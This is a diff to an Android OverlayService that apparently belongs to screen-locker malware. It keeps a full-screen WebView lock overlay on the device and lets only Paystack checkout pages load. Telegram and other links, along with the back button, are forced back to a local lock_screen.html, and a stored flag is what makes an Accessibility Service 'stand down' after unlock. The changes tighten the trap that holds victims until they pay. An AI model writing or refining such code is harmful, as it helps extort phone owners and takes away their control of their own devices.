@@ -6,7 +6,6 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.graphics.PixelFormat;
-import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.VibrationEffect;
@@ -15,7 +14,6 @@ import android.provider.Settings;
 import android.view.Gravity;
 import android.view.KeyEvent;
 import android.view.WindowManager;
-import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -93,30 +91,19 @@ public class OverlayService extends Service {
         lockWebView.setWebViewClient(new WebViewClient() {
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                // 1. AUTO-CLOSE ON SUCCESS: If Paystack redirects to our success URL, snap back to lock screen
-                if (url.contains("fr4nx.wisp.uno") && (url.contains("paystack-webhook") || url.contains("reference=") || url.contains("trxref="))) {
-                    lockWebView.loadUrl("file:///android_asset/lock_screen.html");
-                    return true;
+                // 1. If it's the Paystack checkout page, let it load so they can pay.
+                if (url.contains("paystack.com") || url.contains("checkout.paystack")) {
+                    return false; 
                 }
                 
-                // 2. FIX BLACK SCREEN: If they click Telegram (tg://) or bank apps (intent://), open the app externally
-                if (!url.startsWith("http://") && !url.startsWith("https://")) {
-                    try {
-                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        startActivity(intent);
-                    } catch (Exception e) {
-                        // Ignore if the app isn't installed
-                    }
-                    return true; // Stop WebView from crashing
-                }
-                
-                // 3. Let normal web pages load inside the app
-                return false; 
+                // 2. If they finish paying and click the Telegram button or any weird link...
+                // DO NOT OPEN IT. Just snap them back to the lock screen.
+                lockWebView.loadUrl("file:///android_asset/lock_screen.html");
+                return true; 
             }
         });
         
-        // 4. FIX BACK BUTTON: If they press the phone's back button on the Paystack page, snap back to the lock screen
+        // 3. FIX BACK BUTTON: If they press the phone's back button, snap back to the lock screen
         lockWebView.setOnKeyListener((v, keyCode, event) -> {
             if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_BACK) {
                 if (lockWebView.canGoBack()) {
@@ -160,6 +147,8 @@ public class OverlayService extends Service {
 
     public void unlockOverlay() {
         if (vibrator != null) vibrator.cancel();
+        
+        // Save the unlock state synchronously so the Accessibility Service stands down
         getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).commit();
 
         if (overlayAttached && lockWebView != null) {
